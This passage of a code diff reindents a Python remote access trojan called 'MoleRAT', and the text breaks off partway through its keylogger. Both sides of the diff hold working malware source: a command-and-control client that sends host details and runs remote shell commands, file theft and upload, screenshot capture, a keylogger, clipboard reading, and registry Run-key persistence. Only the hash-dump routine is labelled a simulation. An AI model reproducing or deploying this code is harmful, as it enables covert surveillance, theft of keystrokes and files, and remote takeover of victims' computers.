@@ -18,33 +18,34 @@ import subprocess
 import logging
 import sqlite3
 import shutil
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta # type: ignore
 import json
 import win32crypt # type: ignore
 import queue
 import struct
-import threading
+import threading # type: ignore
 import time
 import select
+import msvcrt
 
 # Try to import optional dependencies
 try:
-    from pynput import keyboard  # type: ignore
-    PYNPUT_AVAILABLE = True
+	from pynput import keyboard  # type: ignore
+	PYNPUT_AVAILABLE = True
 except ImportError:
-    PYNPUT_AVAILABLE = False
+	PYNPUT_AVAILABLE = False
 
 try:
-    import cv2  # type: ignore
-    CV2_AVAILABLE = True
+	import cv2  # type: ignore
+	CV2_AVAILABLE = True
 except ImportError:
-    CV2_AVAILABLE = False
+	CV2_AVAILABLE = False
 
 try:
-    import win32clipboard  # type: ignore
-    WIN32CLIPBOARD_AVAILABLE = True
+	import win32clipboard  # type: ignore
+	WIN32CLIPBOARD_AVAILABLE = True
 except ImportError:
-    WIN32CLIPBOARD_AVAILABLE = False
+	WIN32CLIPBOARD_AVAILABLE = False
 
 CONFIG_FILE = "config.json"
 
@@ -106,625 +107,625 @@ while True:
 RAT_CONFIG_FILE = "rat_config.json"
 
 def load_rat_config():
-    """Load or create RAT configuration"""
-    default_config = {
-        "c2_host": "127.0.0.1",
-        "c2_port": 4444,
-        "persistence": False,
-        "startup": False,
-        "stealth_mode": True,
-        "reconnect_interval": 30,
-        "keylogger": False,
-        "screenshare_port": 5555,
-        "audio_port": 6666
-    }
-    
-    if os.path.exists(RAT_CONFIG_FILE):
-        try:
-            with open(RAT_CONFIG_FILE, "r") as f:
-                user_config = json.load(f)
-                default_config.update(user_config)
-        except:
-            print(Fore.RED + "Error loading RAT config, using defaults")
-    
-    return default_config
+	"""Load or create RAT configuration"""
+	default_config = {
+		"c2_host": "127.0.0.1",
+		"c2_port": 4444,
+		"persistence": False,
+		"startup": False,
+		"stealth_mode": True,
+		"reconnect_interval": 30,
+		"keylogger": False,
+		"screenshare_port": 5555,
+		"audio_port": 6666
+	}
+	
+	if os.path.exists(RAT_CONFIG_FILE):
+		try:
+			with open(RAT_CONFIG_FILE, "r") as f:
+				user_config = json.load(f)
+				default_config.update(user_config)
+		except:
+			print(Fore.RED + "Error loading RAT config, using defaults")
+	
+	return default_config
 
 def save_rat_config(config):
-    """Save RAT configuration"""
-    with open(RAT_CONFIG_FILE, "w") as f:
-        json.dump(config, f, indent=4)
+	"""Save RAT configuration"""
+	with open(RAT_CONFIG_FILE, "w") as f:
+		json.dump(config, f, indent=4)
 
 # ========== BASE RAT CLASS ==========
 class RemoteAccessTool:
-    def __init__(self, config):
-        self.config = config
-        self.sock = None
-        self.running = False
-        self.command_queue = queue.Queue()
-        
-    def connect_to_c2(self):
-        """Establish connection to Command & Control server"""
-        try:
-            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.sock.settimeout(30)
-            self.sock.connect((self.config["c2_host"], self.config["c2_port"]))
-            
-            # Send system info as handshake
-            system_info = {
-                "hostname": platform.node(),
-                "os": platform.system(),
-                "user": os.getlogin(),
-                "ip": socket.gethostbyname(socket.gethostname())
-            }
-            self.send_json(system_info)
-            
-            logging.info(f"Connected to C2 at {self.config['c2_host']}:{self.config['c2_port']}")
-            return True
-            
-        except Exception as e:
-            logging.error(f"C2 connection failed: {e}")
-            return False
-    
-    def send_json(self, data):
-        """Send JSON data with length prefix"""
-        json_data = json.dumps(data).encode('utf-8')
-        length = struct.pack('!I', len(json_data))
-        self.sock.sendall(length + json_data)
-    
-    def receive_json(self):
-        """Receive JSON data with length prefix"""
-        try:
-            length_data = self._recv_exact(4)
-            if not length_data:
-                return None
-            length = struct.unpack('!I', length_data)[0]
-            json_data = self._recv_exact(length)
-            return json.loads(json_data.decode('utf-8'))
-        except:
-            return None
-    
-    def _recv_exact(self, n):
-        """Receive exactly n bytes"""
-        data = b''
-        while len(data) < n:
-            packet = self.sock.recv(n - len(data))
-            if not packet:
-                return None
-            data += packet
-        return data
-    
-    def _is_connected(self):
-        """Check if socket is still connected"""
-        try:
-            self.sock.send(b'')
-            return True
-        except:
-            return False
-    
-    def execute_shell(self, command):
-        """Execute shell command"""
-        try:
-            result = subprocess.run(
-                command,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=30
-            )
-            return {
-                "stdout": result.stdout,
-                "stderr": result.stderr,
-                "returncode": result.returncode
-            }
-        except subprocess.TimeoutExpired:
-            return {"error": "Command timeout"}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def download_file(self, lpath, rpath):
-        """Send file to C2"""
-        try:
-            if not os.path.exists(rpath):
-                return {"error": "File not found"}
-            
-            with open(rpath, "rb") as f:
-                content = f.read()
-            
-            return {
-                "filename": os.path.basename(rpath),
-                "content": base64.b64encode(content).decode('utf-8'),
-                "size": len(content)
-            }
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def upload_file(self, lpath, rpath, content):
-        """Receive file from C2"""
-        try:
-            content_bytes = base64.b64decode(content)
-            
-            # Create directory if needed
-            os.makedirs(os.path.dirname(rpath), exist_ok=True)
-            
-            with open(rpath, "wb") as f:
-                f.write(content_bytes)
-            
-            return {"status": f"File uploaded: {rpath}"}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def take_screenshot(self):
-        """Capture screenshot"""
-        try:
-            # Simple screenshot using PowerShell on Windows
-            if platform.system() == "Windows":
-                import tempfile
-                temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
-                temp_file.close()
-                
-                ps_command = f"""
-                Add-Type -AssemblyName System.Windows.Forms
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-                $bitmap.Save("{temp_file.name}")
-                $graphics.Dispose()
-                $bitmap.Dispose()
-                """
-                
-                result = subprocess.run(
-                    ["powershell", "-Command", ps_command],
-                    capture_output=True,
-                    text=True
-                )
-                
-                if os.path.exists(temp_file.name):
-                    with open(temp_file.name, "rb") as f:
-                        img_bytes = f.read()
-                    os.remove(temp_file.name)
-                    
-                    return {
-                        "screenshot": base64.b64encode(img_bytes).decode('utf-8'),
-                        "resolution": "Captured via PowerShell"
-                    }
-                else:
-                    return {"error": "Failed to capture screenshot"}
-            else:
-                return {"error": "Screenshot only available on Windows in this version"}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def get_system_info(self):
-        """Get detailed system information"""
-        info = {
-            "hostname": platform.node(),
-            "os": platform.system(),
-            "os_version": platform.version(),
-            "architecture": platform.architecture(),
-            "processor": platform.processor(),
-            "username": os.getlogin(),
-            "ip": socket.gethostbyname(socket.gethostname()),
-            "cwd": os.getcwd()
-        }
-        return info
-    
-    def set_persistence(self, enable):
-        """Add/remove persistence (Windows only)"""
-        if platform.system() != "Windows":
-            return {"error": "Persistence only works on Windows"}
-        
-        try:
-            script_path = os.path.abspath(sys.argv[0])
-            
-            if enable:
-                # Add to startup registry
-                key_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MoleRAT" /t REG_SZ /d "{script_path}" /f'
-                subprocess.run(key_cmd, shell=True, capture_output=True)
-                return {"status": "Added to startup"}
-            else:
-                # Remove from startup
-                key_cmd = f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MoleRAT" /f'
-                subprocess.run(key_cmd, shell=True, capture_output=True)
-                return {"status": "Removed from startup"}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def run(self):
-        """Main RAT loop"""
-        self.running = True
-        
-        while self.running:
-            if not self.sock or not self._is_connected():
-                print(Fore.YELLOW + "[*] Connecting to C2 server...")
-                if not self.connect_to_c2():
-                    time.sleep(self.config["reconnect_interval"])
-                    continue
-            
-            try:
-                # Wait for command
-                ready = select.select([self.sock], [], [], 1)
-                if ready[0]:
-                    cmd_data = self.receive_json()
-                    if cmd_data:
-                        response = self.execute_command(cmd_data)
-                        self.send_json(response)
-                        
-                        # Handle termination
-                        if cmd_data.get("type") == "kill":
-                            self.running = False
-                            break
-            except Exception as e:
-                logging.error(f"RAT error: {e}")
-                self.sock = None
-        
-        if self.sock:
-            self.sock.close()
-    
-    def execute_command(self, cmd_data):
-        """To be overridden by MeterpreterRAT"""
-        return {"error": "Base class - use MeterpreterRAT"}
+	def __init__(self, config):
+		self.config = config
+		self.sock = None
+		self.running = False
+		self.command_queue = queue.Queue()
+		
+	def connect_to_c2(self):
+		"""Establish connection to Command & Control server"""
+		try:
+			self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			self.sock.settimeout(30)
+			self.sock.connect((self.config["c2_host"], self.config["c2_port"]))
+			
+			# Send system info as handshake
+			system_info = {
+				"hostname": platform.node(),
+				"os": platform.system(),
+				"user": os.getlogin(),
+				"ip": socket.gethostbyname(socket.gethostname())
+			}
+			self.send_json(system_info)
+			
+			logging.info(f"Connected to C2 at {self.config['c2_host']}:{self.config['c2_port']}")
+			return True
+			
+		except Exception as e:
+			logging.error(f"C2 connection failed: {e}")
+			return False
+	
+	def send_json(self, data):
+		"""Send JSON data with length prefix"""
+		json_data = json.dumps(data).encode('utf-8')
+		length = struct.pack('!I', len(json_data))
+		self.sock.sendall(length + json_data)
+	
+	def receive_json(self):
+		"""Receive JSON data with length prefix"""
+		try:
+			length_data = self._recv_exact(4)
+			if not length_data:
+				return None
+			length = struct.unpack('!I', length_data)[0]
+			json_data = self._recv_exact(length)
+			return json.loads(json_data.decode('utf-8'))
+		except:
+			return None
+	
+	def _recv_exact(self, n):
+		"""Receive exactly n bytes"""
+		data = b''
+		while len(data) < n:
+			packet = self.sock.recv(n - len(data))
+			if not packet:
+				return None
+			data += packet
+		return data
+	
+	def _is_connected(self):
+		"""Check if socket is still connected"""
+		try:
+			self.sock.send(b'')
+			return True
+		except:
+			return False
+	
+	def execute_shell(self, command):
+		"""Execute shell command"""
+		try:
+			result = subprocess.run(
+				command,
+				shell=True,
+				capture_output=True,
+				text=True,
+				timeout=30
+			)
+			return {
+				"stdout": result.stdout,
+				"stderr": result.stderr,
+				"returncode": result.returncode
+			}
+		except subprocess.TimeoutExpired:
+			return {"error": "Command timeout"}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def download_file(self, lpath, rpath):
+		"""Send file to C2"""
+		try:
+			if not os.path.exists(rpath):
+				return {"error": "File not found"}
+			
+			with open(rpath, "rb") as f:
+				content = f.read()
+			
+			return {
+				"filename": os.path.basename(rpath),
+				"content": base64.b64encode(content).decode('utf-8'),
+				"size": len(content)
+			}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def upload_file(self, lpath, rpath, content):
+		"""Receive file from C2"""
+		try:
+			content_bytes = base64.b64decode(content)
+			
+			# Create directory if needed
+			os.makedirs(os.path.dirname(rpath), exist_ok=True)
+			
+			with open(rpath, "wb") as f:
+				f.write(content_bytes)
+			
+			return {"status": f"File uploaded: {rpath}"}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def take_screenshot(self):
+		"""Capture screenshot"""
+		try:
+			# Simple screenshot using PowerShell on Windows
+			if platform.system() == "Windows":
+				import tempfile
+				temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
+				temp_file.close()
+				
+				ps_command = f"""
+				Add-Type -AssemblyName System.Windows.Forms
+				$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+				$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+				$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+				$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+				$bitmap.Save("{temp_file.name}")
+				$graphics.Dispose()
+				$bitmap.Dispose()
+				"""
+				
+				result = subprocess.run(
+					["powershell", "-Command", ps_command],
+					capture_output=True,
+					text=True
+				)
+				
+				if os.path.exists(temp_file.name):
+					with open(temp_file.name, "rb") as f:
+						img_bytes = f.read()
+					os.remove(temp_file.name)
+					
+					return {
+						"screenshot": base64.b64encode(img_bytes).decode('utf-8'),
+						"resolution": "Captured via PowerShell"
+					}
+				else:
+					return {"error": "Failed to capture screenshot"}
+			else:
+				return {"error": "Screenshot only available on Windows in this version"}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def get_system_info(self):
+		"""Get detailed system information"""
+		info = {
+			"hostname": platform.node(),
+			"os": platform.system(),
+			"os_version": platform.version(),
+			"architecture": platform.architecture(),
+			"processor": platform.processor(),
+			"username": os.getlogin(),
+			"ip": socket.gethostbyname(socket.gethostname()),
+			"cwd": os.getcwd()
+		}
+		return info
+	
+	def set_persistence(self, enable):
+		"""Add/remove persistence (Windows only)"""
+		if platform.system() != "Windows":
+			return {"error": "Persistence only works on Windows"}
+		
+		try:
+			script_path = os.path.abspath(sys.argv[0])
+			
+			if enable:
+				# Add to startup registry
+				key_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MoleRAT" /t REG_SZ /d "{script_path}" /f'
+				subprocess.run(key_cmd, shell=True, capture_output=True)
+				return {"status": "Added to startup"}
+			else:
+				# Remove from startup
+				key_cmd = f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MoleRAT" /f'
+				subprocess.run(key_cmd, shell=True, capture_output=True)
+				return {"status": "Removed from startup"}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def run(self):
+		"""Main RAT loop"""
+		self.running = True
+		
+		while self.running:
+			if not self.sock or not self._is_connected():
+				print(Fore.YELLOW + "[*] Connecting to C2 server...")
+				if not self.connect_to_c2():
+					time.sleep(self.config["reconnect_interval"])
+					continue
+			
+			try:
+				# Wait for command
+				ready = select.select([self.sock], [], [], 1)
+				if ready[0]:
+					cmd_data = self.receive_json()
+					if cmd_data:
+						response = self.execute_command(cmd_data)
+						self.send_json(response)
+						
+						# Handle termination
+						if cmd_data.get("type") == "kill":
+							self.running = False
+							break
+			except Exception as e:
+				logging.error(f"RAT error: {e}")
+				self.sock = None
+		
+		if self.sock:
+			self.sock.close()
+	
+	def execute_command(self, cmd_data):
+		"""To be overridden by MeterpreterRAT"""
+		return {"error": "Base class - use MeterpreterRAT"}
 
 # ========== METERPRETER RAT CLASS ==========
 class MeterpreterRAT(RemoteAccessTool):
-    """Enhanced RAT with Meterpreter-style commands"""
-    
-    def __init__(self, config):
-        super().__init__(config)
-        self.keylogger_running = False
-        self.keylogger_buffer = []
-        self.listener = None
-        
-    def execute_command(self, cmd_data):
-        """Execute Meterpreter-style commands"""
-        cmd_type = cmd_data.get("type")
-        
-        # Core commands
-        if cmd_type == "sysinfo":
-            return self.get_system_info()
-        elif cmd_type == "ps":
-            return self.list_processes_detailed()
-        elif cmd_type == "kill":
-            return self.kill_process(cmd_data.get("pid"))
-        elif cmd_type == "getpid":
-            return {"pid": os.getpid()}
-        elif cmd_type == "pwd":
-            return {"cwd": os.getcwd()}
-        elif cmd_type == "ls" or cmd_type == "dir":
-            return self.list_directory(cmd_data.get("path", "."))
-        elif cmd_type == "cd":
-            return self.change_directory(cmd_data.get("path"))
-        elif cmd_type == "cat" or cmd_type == "type":
-            return self.read_file(cmd_data.get("path"))
-        elif cmd_type == "download":
-            return self.download_file(cmd_data.get("lpath"), cmd_data.get("rpath"))
-        elif cmd_type == "upload":
-            return self.upload_file(cmd_data.get("lpath"), cmd_data.get("rpath"), cmd_data.get("content", ""))
-        elif cmd_type == "rm" or cmd_type == "del":
-            return self.delete_file(cmd_data.get("path"))
-        
-        # Shell commands
-        elif cmd_type == "shell":
-            return self.execute_shell(cmd_data.get("command"))
-        elif cmd_type == "execute":
-            return self.execute_program(cmd_data.get("path"), cmd_data.get("args", ""))
-        
-        # Screenshot/Webcam
-        elif cmd_type == "screenshot":
-            return self.take_screenshot()
-        
-        # Keylogger
-        elif cmd_type == "keyscan_start":
-            return self.start_keylogger()
-        elif cmd_type == "keyscan_stop":
-            return self.stop_keylogger()
-        elif cmd_type == "keyscan_dump":
-            return self.dump_keylogger()
-        elif cmd_type == "keyscan_clear":
-            return self.clear_keylogger_buffer()
-        
-        # Clipboard
-        elif cmd_type == "clipboard_get":
-            return self.get_clipboard()
-        elif cmd_type == "clipboard_set":
-            return self.set_clipboard(cmd_data.get("text", ""))
-        
-        # Persistence
-        elif cmd_type == "persistence":
-            return self.set_persistence(cmd_data.get("enable", False))
-        
-        # Network
-        elif cmd_type == "ipconfig":
-            return self.get_network_info()
-        
-        # System
-        elif cmd_type == "reboot":
-            return self.reboot_system()
-        elif cmd_type == "shutdown":
-            return self.shutdown_system()
-        
-        # Mimikatz-style (simulated)
-        elif cmd_type == "hashdump":
-            return self.dump_hashes()
-        
-        elif cmd_type == "kill_session":
-            self.running = False
-            return {"status": "Session terminating"}
-        
-        else:
-            return {"error": f"Unknown command: {cmd_type}"}
-    
-    # ========== METERPRETER METHODS ==========
-    
-    def list_processes_detailed(self):
-        """List processes with details"""
-        processes = []
-        try:
-            if platform.system() == "Windows":
-                cmd = 'tasklist /FO CSV /NH'
-                output = subprocess.check_output(cmd, shell=True, text=True)
-                for line in output.strip().split('\n'):
-                    if line:
-                        parts = line.strip('"').split('","')
-                        if len(parts) >= 5:
-                            processes.append({
-                                "name": parts[0],
-                                "pid": int(parts[1]),
-                                "session": parts[2],
-                                "memory": parts[4]
-                            })
-            else:
-                cmd = 'ps aux'
-                output = subprocess.check_output(cmd, shell=True, text=True)
-                lines = output.strip().split('\n')[1:]
-                for line in lines:
-                    parts = line.split()
-                    if len(parts) >= 11:
-                        processes.append({
-                            "user": parts[0],
-                            "pid": int(parts[1]),
-                            "cpu": parts[2],
-                            "mem": parts[3],
-                            "command": ' '.join(parts[10:])[:50]
-                        })
-            return {"processes": processes}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def kill_process(self, pid):
-        """Kill a process by PID"""
-        try:
-            if platform.system() == "Windows":
-                subprocess.run(f"taskkill /PID {pid} /F", shell=True)
-            else:
-                subprocess.run(f"kill -9 {pid}", shell=True)
-            return {"status": f"Killed process {pid}"}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def list_directory(self, path):
-        """List directory contents"""
-        try:
-            if not os.path.exists(path):
-                return {"error": f"Path not found: {path}"}
-            
-            items = []
-            for item in os.listdir(path):
-                item_path = os.path.join(path, item)
-                try:
-                    stat = os.stat(item_path)
-                    items.append({
-                        "name": item,
-                        "type": "dir" if os.path.isdir(item_path) else "file",
-                        "size": stat.st_size,
-                        "modified": stat.st_mtime
-                    })
-                except:
-                    items.append({
-                        "name": item,
-                        "type": "unknown",
-                        "size": 0,
-                        "modified": 0
-                    })
-            
-            return {"path": path, "items": items}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def change_directory(self, path):
-        """Change current directory"""
-        try:
-            os.chdir(path)
-            return {"cwd": os.getcwd()}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def read_file(self, path):
-        """Read file contents"""
-        try:
-            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-                content = f.read(10000)  # First 10k chars
-            return {"path": path, "content": content, "truncated": len(content) == 10000}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def delete_file(self, path):
-        """Delete file"""
-        try:
-            os.remove(path)
-            return {"status": f"Deleted: {path}"}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def execute_program(self, path, args=""):
-        """Execute a program"""
-        try:
-            cmd = f'"{path}" {args}' if args else f'"{path}"'
-            result = subprocess.run(
-                cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=30
-            )
-            return {
-                "stdout": result.stdout,
-                "stderr": result.stderr,
-                "returncode": result.returncode
-            }
-        except Exception as e:
-            return {"error": str(e)}
-    
-    # ========== KEYLOGGER ==========
-    
-    def start_keylogger(self):
-        """Start keylogger"""
-        if not PYNPUT_AVAILABLE:
-            return {"error": "pynput not installed. Run: pip install pynput"}
-        
-        if self.keylogger_running:
-            return {"status": "Keylogger already running"}
-        
-        try:
-            self.keylogger_running = True
-            self.keylogger_buffer = []
-            
-            def on_press(key):
-                if self.keylogger_running:
-                    try:
-                        key_str = key.char
-                    except AttributeError:
-                        key_str = f"[{key.name.upper()}]"
-                    
-                    self.keylogger_buffer.append({
-                        "key": key_str,
-                        "time": time.time()
-                    })
-            
-            # Start listener in background thread
-            self.listener = keyboard.Listener(on_press=on_press)
-            self.listener.start()
-            
-            return {"status": "Keylogger started"}
-        except Exception as e:
-            self.keylogger_running = False
-            return {"error": f"Failed to start keylogger: {e}"}
-    
-    def stop_keylogger(self):
-        """Stop keylogger"""
-        if not self.keylogger_running:
-            return {"status": "Keylogger not running"}
-        
-        self.keylogger_running = False
-        
-        try:
-            if self.listener:
-                self.listener.stop()
-        except:
-            pass
-        
-        return {"status": "Keylogger stopped", "keys_captured": len(self.keylogger_buffer)}
-    
-    def dump_keylogger(self):
-        """Dump keylogger buffer"""
-        if not self.keylogger_buffer:
-            return {"status": "No keys captured"}
-        
-        # Format captured keys
-        keystrokes = ""
-        for entry in self.keylogger_buffer[-1000:]:  # Last 1000 keys
-            keystrokes += entry['key']
-        
-        return {
-            "keystrokes": keystrokes,
-            "count": len(self.keylogger_buffer),
-            "sample": keystrokes[-1000:] if len(keystrokes) > 1000 else keystrokes
-        }
-    
-    def clear_keylogger_buffer(self):
-        """Clear keylogger buffer"""
-        self.keylogger_buffer = []
-        return {"status": "Keylogger buffer cleared"}
-    
-    # ========== CLIPBOARD ==========
-    
-    def get_clipboard(self):
-        """Get clipboard contents"""
-        if not WIN32CLIPBOARD_AVAILABLE:
-            return {"error": "win32clipboard not available"}
-        
-        try:
-            win32clipboard.OpenClipboard()
-            data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            return {"clipboard": data}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def set_clipboard(self, text):
-        """Set clipboard contents"""
-        if not WIN32CLIPBOARD_AVAILABLE:
-            return {"error": "win32clipboard not available"}
-        
-        try:
-            win32clipboard.OpenClipboard()
-            win32clipboard.EmptyClipboard()
-            win32clipboard.SetClipboardText(text)
-            win32clipboard.CloseClipboard()
-            return {"status": "Clipboard set"}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    # ========== SYSTEM COMMANDS ==========
-    
-    def get_network_info(self):
-        """Get network configuration"""
-        try:
-            if platform.system() == "Windows":
-                result = subprocess.run("ipconfig /all", shell=True, 
-                                      capture_output=True, text=True)
-                return {"output": result.stdout}
-            else:
-                result = subprocess.run("ifconfig -a", shell=True,
-                                      capture_output=True, text=True)
-                return {"output": result.stdout}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def reboot_system(self):
-        """Reboot the system"""
-        try:
-            if platform.system() == "Windows":
-                subprocess.run("shutdown /r /t 0", shell=True)
-            else:
-                subprocess.run("reboot", shell=True)
-            return {"status": "Rebooting..."}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def shutdown_system(self):
-        """Shutdown the system"""
-        try:
-            if platform.system() == "Windows":
-                subprocess.run("shutdown /s /t 0", shell=True)
-            else:
-                subprocess.run("poweroff", shell=True)
-            return {"status": "Shutting down..."}
-        except Exception as e:
-            return {"error": str(e)}
-    
-    def dump_hashes(self):
-        """Simulated hash dump (educational only)"""
-        simulated_hashes = {
-            "note": "This is a SIMULATION for educational purposes",
-            "real_hashes": "Requires admin + SAM/SYSTEM registry or /etc/shadow",
-            "simulated_data": [
-                {"user": "Administrator", "rid": "500", "lm": "aad3b435b51404ee", "ntlm": "31d6cfe0d16ae931b73c59d7e0c089c0"},
-                {"user": "Guest", "rid": "501", "lm": "aad3b435b51404ee", "ntlm": "31d6cfe0d16ae931b73c59d7e0c089c0"},
-                {"user": os.getlogin(), "rid": "1000", "lm": "aad3b435b51404ee", "ntlm": "simulated_hash_here"}
-            ]
-        }
-        return simulated_hashes
+	"""Enhanced RAT with Meterpreter-style commands"""
+	
+	def __init__(self, config):
+		super().__init__(config)
+		self.keylogger_running = False
+		self.keylogger_buffer = []
+		self.listener = None
+		
+	def execute_command(self, cmd_data):
+		"""Execute Meterpreter-style commands"""
+		cmd_type = cmd_data.get("type")
+		
+		# Core commands
+		if cmd_type == "sysinfo":
+			return self.get_system_info()
+		elif cmd_type == "ps":
+			return self.list_processes_detailed()
+		elif cmd_type == "kill":
+			return self.kill_process(cmd_data.get("pid"))
+		elif cmd_type == "getpid":
+			return {"pid": os.getpid()}
+		elif cmd_type == "pwd":
+			return {"cwd": os.getcwd()}
+		elif cmd_type == "ls" or cmd_type == "dir":
+			return self.list_directory(cmd_data.get("path", "."))
+		elif cmd_type == "cd":
+			return self.change_directory(cmd_data.get("path"))
+		elif cmd_type == "cat" or cmd_type == "type":
+			return self.read_file(cmd_data.get("path"))
+		elif cmd_type == "download":
+			return self.download_file(cmd_data.get("lpath"), cmd_data.get("rpath"))
+		elif cmd_type == "upload":
+			return self.upload_file(cmd_data.get("lpath"), cmd_data.get("rpath"), cmd_data.get("content", ""))
+		elif cmd_type == "rm" or cmd_type == "del":
+			return self.delete_file(cmd_data.get("path"))
+		
+		# Shell commands
+		elif cmd_type == "shell":
+			return self.execute_shell(cmd_data.get("command"))
+		elif cmd_type == "execute":
+			return self.execute_program(cmd_data.get("path"), cmd_data.get("args", ""))
+		
+		# Screenshot/Webcam
+		elif cmd_type == "screenshot":
+			return self.take_screenshot()
+		
+		# Keylogger
+		elif cmd_type == "keyscan_start":
+			return self.start_keylogger()
+		elif cmd_type == "keyscan_stop":
+			return self.stop_keylogger()
+		elif cmd_type == "keyscan_dump":
+			return self.dump_keylogger()
+		elif cmd_type == "keyscan_clear":
+			return self.clear_keylogger_buffer()
+		
+		# Clipboard
+		elif cmd_type == "clipboard_get":
+			return self.get_clipboard()
+		elif cmd_type == "clipboard_set":
+			return self.set_clipboard(cmd_data.get("text", ""))
+		
+		# Persistence
+		elif cmd_type == "persistence":
+			return self.set_persistence(cmd_data.get("enable", False))
+		
+		# Network
+		elif cmd_type == "ipconfig":
+			return self.get_network_info()
+		
+		# System
+		elif cmd_type == "reboot":
+			return self.reboot_system()
+		elif cmd_type == "shutdown":
+			return self.shutdown_system()
+		
+		# Mimikatz-style (simulated)
+		elif cmd_type == "hashdump":
+			return self.dump_hashes()
+		
+		elif cmd_type == "kill_session":
+			self.running = False
+			return {"status": "Session terminating"}
+		
+		else:
+			return {"error": f"Unknown command: {cmd_type}"}
+	
+	# ========== METERPRETER METHODS ==========
+	
+	def list_processes_detailed(self):
+		"""List processes with details"""
+		processes = []
+		try:
+			if platform.system() == "Windows":
+				cmd = 'tasklist /FO CSV /NH'
+				output = subprocess.check_output(cmd, shell=True, text=True)
+				for line in output.strip().split('\n'):
+					if line:
+						parts = line.strip('"').split('","')
+						if len(parts) >= 5:
+							processes.append({
+								"name": parts[0],
+								"pid": int(parts[1]),
+								"session": parts[2],
+								"memory": parts[4]
+							})
+			else:
+				cmd = 'ps aux'
+				output = subprocess.check_output(cmd, shell=True, text=True)
+				lines = output.strip().split('\n')[1:]
+				for line in lines:
+					parts = line.split()
+					if len(parts) >= 11:
+						processes.append({
+							"user": parts[0],
+							"pid": int(parts[1]),
+							"cpu": parts[2],
+							"mem": parts[3],
+							"command": ' '.join(parts[10:])[:50]
+						})
+			return {"processes": processes}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def kill_process(self, pid):
+		"""Kill a process by PID"""
+		try:
+			if platform.system() == "Windows":
+				subprocess.run(f"taskkill /PID {pid} /F", shell=True)
+			else:
+				subprocess.run(f"kill -9 {pid}", shell=True)
+			return {"status": f"Killed process {pid}"}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def list_directory(self, path):
+		"""List directory contents"""
+		try:
+			if not os.path.exists(path):
+				return {"error": f"Path not found: {path}"}
+			
+			items = []
+			for item in os.listdir(path):
+				item_path = os.path.join(path, item)
+				try:
+					stat = os.stat(item_path)
+					items.append({
+						"name": item,
+						"type": "dir" if os.path.isdir(item_path) else "file",
+						"size": stat.st_size,
+						"modified": stat.st_mtime
+					})
+				except:
+					items.append({
+						"name": item,
+						"type": "unknown",
+						"size": 0,
+						"modified": 0
+					})
+			
+			return {"path": path, "items": items}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def change_directory(self, path):
+		"""Change current directory"""
+		try:
+			os.chdir(path)
+			return {"cwd": os.getcwd()}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def read_file(self, path):
+		"""Read file contents"""
+		try:
+			with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+				content = f.read(10000)  # First 10k chars
+			return {"path": path, "content": content, "truncated": len(content) == 10000}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def delete_file(self, path):
+		"""Delete file"""
+		try:
+			os.remove(path)
+			return {"status": f"Deleted: {path}"}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	def execute_program(self, path, args=""):
+		"""Execute a program"""
+		try:
+			cmd = f'"{path}" {args}' if args else f'"{path}"'
+			result = subprocess.run(
+				cmd,
+				shell=True,
+				capture_output=True,
+				text=True,
+				timeout=30
+			)
+			return {
+				"stdout": result.stdout,
+				"stderr": result.stderr,
+				"returncode": result.returncode
+			}
+		except Exception as e:
+			return {"error": str(e)}
+	
+	# ========== KEYLOGGER ==========
+	
+	def start_keylogger(self):
+		"""Start keylogger"""
+		if not PYNPUT_AVAILABLE:
+			return {"error": "pynput not installed. Run: pip install pynput"}
+		
+		if self.keylogger_running:
+			return {"status": "Keylogger already running"}
+		
+		try:
+			self.keylogger_running = True
+			self.keylogger_buffer = []
+			
+			def on_press(key):
+				if self.keylogger_running:
+					try:
+						key_str = key.char
+					except AttributeError:
